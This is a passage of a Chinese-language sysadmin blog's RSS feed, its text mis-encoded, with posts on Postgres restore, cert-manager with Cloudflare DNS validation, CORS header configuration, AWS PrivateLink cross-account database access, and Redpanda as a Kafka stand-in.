&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åè¦ç¼–è¾‘çœ‹çœ‹è¿™ä¸ªå¯¼å…¥çš„æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250723135729330&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250723-postgres_dump_restore/image-20250723135729330.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å‘ç°æœ‰create schemaçš„è¯­å¥ï¼Œå¦‚æœç›®çš„æ•°æ®åº“å·²ç»æœ‰äº†ï¼Œé‚£éœ€è¦å»æ‰ã€‚&lt;/p&gt;
&lt;p&gt;å†çœ‹ä¸‹é¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250723135823265&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250723-postgres_dump_restore/image-20250723135823265.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å»ºç«‹äº†ä¸€ä¸ªFUNCTIONï¼Œå¦‚æœå·²ç»å»ºç«‹äº†extensionï¼Œé‚£ä¹Ÿä¼šæŠ¥é”™ï¼Œä¸è¿‡è¿™2ç§é”™è¯¯æˆ‘ä»¬éƒ½å¯ä»¥ç›´æ¥ä¸ç”¨ç®¡ï¼Œç›´æ¥æ‰§è¡Œè¯•è¯•&lt;/p&gt;
&lt;p&gt;ä¸‰ã€å¯¼å…¥ç›®æ ‡åº“&lt;/p&gt;
&lt;p&gt;è·‘ä¸€è·‘ï¼Œçœ‹ä¸€çœ‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;psql -h 10.8.0.1 -U dest -d dest -f export.sql
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠ¥äº†ä¸å°‘é”™&lt;/p&gt;</description>
    </item>
    <item>
      <title>å†…ç½‘kubernetes&#43;cloudflare&#43;cert-managerè‡ªåŠ¨ç­¾å‘è¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20250709-cert_manager_cloudflare/</link>
      <pubDate>Wed, 09 Jul 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250709-cert_manager_cloudflare/</guid>
      <description>&lt;p&gt;è¿™ä¸ªåœºæ™¯éå¸¸çš„æœ‰æ„æ€ï¼š&lt;/p&gt;
&lt;p&gt;å…¬å¸å†…éƒ¨æœ‰è‹¥å¹²ä¸ªkubernetesé›†ç¾¤ï¼Œå±äºæµ‹è¯•ç¯å¢ƒï¼Œç ”å‘æ­å»ºäº†ä¸€å¥—SAASçš„ç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒéœ€è¦xxx.abc.comçš„åŸŸåæ¥è®¿é—®ï¼ŒåŸŸåè§£æè®°å½•å…¨éƒ½æ˜¯192.168.0.xï¼Œä¾›å†…éƒ¨è®¿é—®ï¼ŒåŸŸåä¼šåŠ¨æ€ç”Ÿæˆï¼Œéœ€è¦è¯ä¹¦ä¹Ÿéšä¹‹ç”Ÿæˆï¼Œä¸”dnsåŸŸåæ‰˜ç®¡åœ¨cloudflareä¸Šã€‚&lt;/p&gt;
&lt;p&gt;åŸºæœ¬ç¯å¢ƒå¦‚ä¸Šï¼Œéº»çƒ¦çš„æ˜¯ cert-manager ä¸å¯èƒ½ç­¾å‘ç§ç½‘çš„è¯ä¹¦ï¼Œåªèƒ½æ›²çº¿æ•‘å›½ï¼Œç”¨dnséªŒè¯çš„æ–¹å¼æ¥ç­¾å‘è¯ä¹¦äº†ï¼Œå¦‚æœé…ä¸Š external-dnsï¼Œé‚£dnsè§£æä¹Ÿä¸ç”¨åšäº†ï¼›åªè¦å‘å¸ƒä¸€ä¸ªingressï¼Œå°±ç›´æ¥ç”Ÿæˆdnsè§£æè®°å½•å’Œå¯¹åº”çš„httpsè¯ä¹¦ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“åšæ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€é…ç½® cloudflare API token&lt;/p&gt;
&lt;p&gt;ç™»å½•cloudflareï¼Œå»ç”ŸæˆAPI Tokenï¼Œè·¯å¾„æ˜¯ï¼š&lt;strong&gt;User Profile &amp;gt; API Tokens &amp;gt; API Tokens&lt;/strong&gt;.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Permissionsï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Zone - DNS - Edit&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Zone Resources:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Include - All Zones&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;cert-managerçš„å®˜æ–¹æ–‡æ¡£å±…ç„¶æ˜¯é”™çš„ï¼Œhttps://cert-manager.io/docs/configuration/acme/dns01/cloudflare/&lt;/p&gt;
&lt;p&gt;æ¨èçš„ Zone - Zone - Read æ˜¯åŠ ä¸ä¸Šçš„ï¼Œæœ‰Editå°±è¶³å¤Ÿäº†&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250709104459501&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250709-cert_manager_cloudflare/image-20250709104459501.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åè·å¾—Tokençš„å­—ç¬¦ä¸²xxxxxx&lt;/p&gt;
&lt;p&gt;äºŒã€å®‰è£…cert-manager&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç®€å•ï¼Œç›´æ¥ç”¨helmå®‰è£…&lt;/p&gt;
&lt;p&gt;ç°åœ¨è¿™ä¸ªæ—¶é—´èŠ‚ç‚¹ï¼Œ&lt;code&gt;2025.07.09ï¼Œcert-manager æ˜¯ v1.18.2&lt;/code&gt;ï¼Œæ‰€ä»¥ç”¨æ–°å‘½ä»¤æ‰§è¡Œå®‰è£…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo add jetstack https://charts.jetstack.io
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm repo update
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#è€ç‰ˆæœ¬æ¯”å¦‚1.0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set &lt;span class=&#34;nv&#34;&gt;installCRDs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ–°ç‰ˆæœ¬v1.18.2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;helm install cert-manager jetstack/cert-manager --namespace cert-manager --create-namespace --set crds.enabled&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€å‡†å¤‡ç­¾å‘æœºæ„Issuer&lt;/p&gt;</description>
    </item>
    <item>
      <title>CORSè·¨åŸŸåœ¨ä¸åŒç¯å¢ƒä¸­çš„é…ç½®</title>
      <link>https://rendoumi.com/posts/20250617-cors/</link>
      <pubDate>Tue, 17 Jun 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250617-cors/</guid>
      <description>&lt;p&gt;Cross-Origin Resource Sharing (CORS) è·¨åŸŸï¼Œä¸€ä¸ªç½‘ç«™å¼•ç”¨äº†å¦å¤–ä¸€ä¸ªç½‘ç«™çš„èµ„æºï¼Œå°±éœ€è¦è·¨åŸŸäº†ã€‚&lt;/p&gt;
&lt;p&gt;æœ€é€šä¿—ç‚¹ï¼Œå°±æ˜¯æœåŠ¡å™¨çš„è¿”å›å¤´ä¸Šè¦åŠ ä¸Šä¸‰è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Origin&lt;span class=&#34;s2&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;*&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s2&#34;&gt;Access-Control-Allow-Methods&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET, POST, OPTIONS&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Access-Control-Allow-Headers&lt;span class=&#34;s2&#34;&gt;&amp;#34;, &amp;#34;&lt;/span&gt;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&lt;span class=&#34;s2&#34;&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´ç™½ç‚¹ï¼šå°±æ˜¯å…è®¸çš„æ¥æºç«™ï¼Œå…è®¸çš„æ–¹æ³•ï¼Œå…è®¸çš„å¤´ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;é‚£åœ¨ä¸åŒçš„åœ°æ–¹é…ç½®åˆä¸ç›¸åŒï¼š&lt;/p&gt;
&lt;h5 id=&#34;ä¸€nginx&#34;&gt;ä¸€ã€Nginx&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    server &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        add_header Access-Control-Allow-Origin *&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        add_header Access-Control-Allow-Methods &lt;span class=&#34;s1&#34;&gt;&amp;#39;GET, POST, OPTIONS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        add_header Access-Control-Allow-Headers &lt;span class=&#34;s1&#34;&gt;&amp;#39;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;äºŒopenrestyä¸­çš„luaè„šæœ¬&#34;&gt;äºŒã€openrestyä¸­çš„luaè„šæœ¬&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;location /pg/nginit &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    rewrite_by_lua_block &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ngx.log&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ngx.ERR, &lt;span class=&#34;s2&#34;&gt;&amp;#34;Environment configuration update, about to get configuration information from redis&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        -- æ·»åŠ è·¨åŸŸ CORS å¤´
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ngx.header&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Access-Control-Allow-Origin&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;*&amp;#34;&lt;/span&gt;  -- å…è®¸æ‰€æœ‰åŸŸåè¯·æ±‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ngx.header&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Access-Control-Allow-Methods&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET, POST, OPTIONS&amp;#34;&lt;/span&gt;  -- å…è®¸çš„æ–¹æ³•
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ngx.header&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Access-Control-Allow-Headers&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,Authorization&amp;#34;&lt;/span&gt;  -- å…è®¸çš„è¯·æ±‚å¤´
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;ä¸‰awsçš„s3&#34;&gt;ä¸‰ã€AWSçš„S3&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;CORSConfiguration&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;CORSRule&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;AllowedOrigin&amp;gt;http://example.com&amp;lt;/AllowedOrigin&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;AllowedMethod&amp;gt;GET&amp;lt;/AllowedMethod&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;AllowedHeader&amp;gt;*&amp;lt;/AllowedHeader&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/CORSRule&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/CORSConfiguration&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;å››aws-lambda-æˆ–è€…-api-gateway&#34;&gt;å››ã€AWS Lambda æˆ–è€… API Gateway&lt;/h5&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;headers: &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span&gt;: &lt;span class=&#34;s1&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s1&#34;&gt;&amp;#39;Access-Control-Allow-Credentials&amp;#39;&lt;/span&gt;: true,
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æœ€åï¼ŒAWSçš„ALBä¸æ”¯æŒé…ç½®CORSï¼ï¼ï¼ï¼Œå¿…é¡»åœ¨åç«¯çš„ application ä¸­è®¾ç½®ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>AWSçš„è·¨è´¦å·è®¿é—®ä¸åŒVPCåŸŸä¸­çš„æœåŠ¡</title>
      <link>https://rendoumi.com/posts/20250521-aws_endpoint/</link>
      <pubDate>Wed, 21 May 2025 09:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250521-aws_endpoint/</guid>
      <description>&lt;p&gt;å…¬å¸æœ‰ä¸¤ä¸ªAWSè´¦å·ï¼Œæœ‰å„è‡ªä¸åŒçš„ VPC åŸŸã€‚å…¶ä¸­ä¸€ä¸ªè´¦å·ç”¨åˆ°äº† Aurora Postgres Serveless çš„æ•°æ®åº“ã€‚&lt;/p&gt;
&lt;p&gt;ç°åœ¨å¦ä¸€ä¸ªè´¦å·ä¹Ÿéœ€è¦ç”¨åˆ°posgresæ•°æ®åº“ï¼Œæœ€ç›´æ¥çš„æƒ³æ³•æ˜¯åœ¨æœ¬åŸŸå†æ­ä¸€å¥—postgresï¼Œæˆ–è€…ec2æ–°åŠ ä¸€å°ï¼Œä¸Šé¢å®‰è£…posgresã€‚&lt;/p&gt;
&lt;p&gt;å…ˆå»æ£€æŸ¥äº†ä¸€ä¸‹å·²æœ‰çš„postgres serverlessæœåŠ¡ï¼Œç»“æœä½¿ç”¨ç‡æ‰23%ï¼Œå½“ä¸‹å°±ç›´æ¥æƒ³å¤ç”¨å®ƒäº†ã€‚&lt;/p&gt;
&lt;p&gt;é‚£èƒ½ä¸èƒ½å•ç‹¬å†å¼€ä¸€ä¸ªdbï¼Œå•ç‹¬ç»™ç¬¬äºŒä¸ªè´¦å·ç”¨å‘¢ï¼ŒæŸ¥äº†åŠå¤©èµ„æ–™ã€‚å¯ä»¥çš„ï¼Œä½†æ˜¯å§ï¼ŒchatgptçœŸçš„æ˜¯æ»¡å˜´èƒ¡è¯´å…«é“ï¼Œè¿å¸¦geminiä¹Ÿæ˜¯ã€‚&lt;/p&gt;
&lt;p&gt;awså®¶çš„ä¸œè¥¿éƒ½æ˜¯å¼€æºç»è¿‡é­”æ”¹ï¼Œè·Ÿç½‘ä¸Šå å¤§å¤šæ•°çš„èµ„æ–™æ˜¯ä¸åŒçš„ï¼Œè¿™ç›´æ¥å¯¼è‡´ chatgpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;è¿˜æœ‰å°±æ˜¯awså®¶çš„ä¸œè¥¿æ›´æ–°ä¿®æ”¹å¾ˆå¿«ï¼Œæœ€æ–°çš„æ–‡æ¡£å’Œä¹‹å‰çš„æ–‡æ¡£ä¸åŒï¼Œä¹Ÿå¯¼è‡´ chatpt æŒ‰ç…§ç½‘ä¸Šå¤§å¤šæ•°çš„æ—§æ–‡æ¡£æ¥è¿›è¡Œæ¨ç†ï¼Œå¯¼è‡´é”™è¯¯ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100034306&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100034306.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªä¸œè¥¿çš„æ¶æ„å›¾å¦‚ä¸Šï¼Œå³è¾¹çš„VPCé‡Œé¢è¿ç€ aurora æœåŠ¡ï¼Œå®ƒå®é™…æ˜¯target groupçš„ä¸€ä¸ªç›®æ ‡ï¼Œç„¶åä¸Šè”åˆ°nlbï¼Œnlbå†ä¸Šè”åˆ°endpoint serviceï¼Œå¯¹å¤–æä¾›æœåŠ¡.&lt;/p&gt;
&lt;p&gt;ç„¶åå·¦é¢VPCä¸­å»ºendpointï¼Œé€šè¿‡PrivateLinkè¿æ¥åˆ°å³è¾¹çš„EndpointServiceï¼Œè¿™æ ·é€šè¿‡ç§æœ‰çš„dns nameå’Œsecurity groupå†è¿›è¡Œæ§åˆ¶ï¼Œå°±å¯ä»¥ç›´æ¥è¿åˆ°å³è¾¹çš„endpoint serviceæœåŠ¡èµ„æºäº†ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“çš„åšæ³•æ­¥éª¤å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;h2 id=&#34;ä¸€ç¬¬ä¸€æ­¥å³è¾¹çš„vpcä¸­&#34;&gt;ä¸€ã€ç¬¬ä¸€æ­¥ï¼Œå³è¾¹çš„VPCä¸­&lt;/h2&gt;
&lt;p&gt;1ã€å»ºç«‹EndpointService&lt;/p&gt;
&lt;p&gt;åˆ°VPCä¸­ï¼Œå·¦è¾¹çš„Endpoint Servicesï¼Œç‚¹å‡»ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521105156766&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521105156766.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»Create endpoint serviceæ–°å»ºä¸€ä¸ª&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100551854&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100551854.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åå­—ï¼špostgresql-serverless-endpoint-serviceï¼Œç”±äºç°åœ¨è¿˜æ²¡æœ‰nlbï¼Œéœ€è¦å†æ–°å»ºä¸€ä¸ªï¼›ç‚¹å‡»Create new load balancer&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100641452&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100641452.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2ã€å»ºç«‹nlb&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»ï¼šCreate load balanceræ–°å»º&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100713535&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100713535.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªç±»å‹ï¼Œåªèƒ½æ˜¯nlb&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100748945&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100748945.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬è¿™ä¸ªnlbï¼Œä¸æ”¾åœ¨å…¬ç½‘ï¼Œä¸å…¬å¼€ï¼Œæ‰€ä»¥é€‰ç§æœ‰çš„Internalï¼Œåªæœ‰IPV4ï¼Œä¸æä¾›IPV6.&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521100909962&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521100909962.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç½‘ç»œé€‰è¯¥VPCï¼Œå­ç½‘é€‰æ‹©ä¸‰ä¸ªprivateçš„å­ç½‘&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521101224868&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521101224868.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;Security groupsé€‰æ‹©ä¸€ä¸‹ï¼Œè¿™é‡Œrds-sgçš„inboundè§„åˆ™æ˜¯å…è®¸TCPç«¯å£5432çš„è¿›å…¥ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªSG&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521101324400&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521101324400.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;åˆ°æœ€åäº†ï¼Œå±…ç„¶è¿˜æ²¡æœ‰target groupï¼Œé‚£åˆè¦å»ºä¸€ä¸ªäº†ï¼Œç‚¹å‡»Create target groupå»ºç«‹&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521101429096&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521101429096.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3ã€å»ºç«‹target group&lt;/p&gt;
&lt;p&gt;åå­—å«åšï¼špostgres-target-group&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬é€‰IP addressesï¼Œå› ä¸ºè¦è¿åˆ°åé¢çš„postgresæœåŠ¡&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20250521101530207&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20250521-aws_endpoint/image-20250521101530207.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åé€‰å¥½TCPï¼ŒPort 5432ï¼Œ IPV4ï¼ŒVPCï¼Œå…¶å®ƒä¿æŒç¼ºçœï¼Œç„¶åå»ºç«‹&lt;/p&gt;</description>
    </item>
    <item>
      <title>kafkaçš„æµ‹è¯•æ›¿ä»£å“-redpanda</title>
      <link>https://rendoumi.com/posts/20250516-redpanda/</link>
      <pubDate>Fri, 16 May 2025 12:01:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20250516-redpanda/</guid>
      <description>&lt;p&gt;å…¬å¸çš„ä¸€ä¸ªå…¬ç½‘è¦æ¬åˆ°å†…ç½‘çš„ä¸€ä¸ªRancheré›†ç¾¤ä¸Šï¼Œå¾ˆç¹ç&lt;/p&gt;
&lt;p&gt;åŸæœ‰çš„æ¶æ„æœ‰kafkaï¼Œè¦åœ¨å†…ç½‘å¤ç°ä¸€ä¸ªå‡ºæ¥&lt;/p&gt;
&lt;p&gt;é‚£3èŠ‚ç‚¹çš„kafkaå’Œ3èŠ‚ç‚¹çš„zookeeperï¼ŒçœŸçš„æ˜¯ä¸æƒ³æ­å•Š&lt;/p&gt;
&lt;p&gt;æœå•Šæœå•Šæœå•Šæœï¼Œç»ˆäºæ‰¾åˆ°è‹¥å¹²å¹³æ›¿ï¼š&lt;/p&gt;
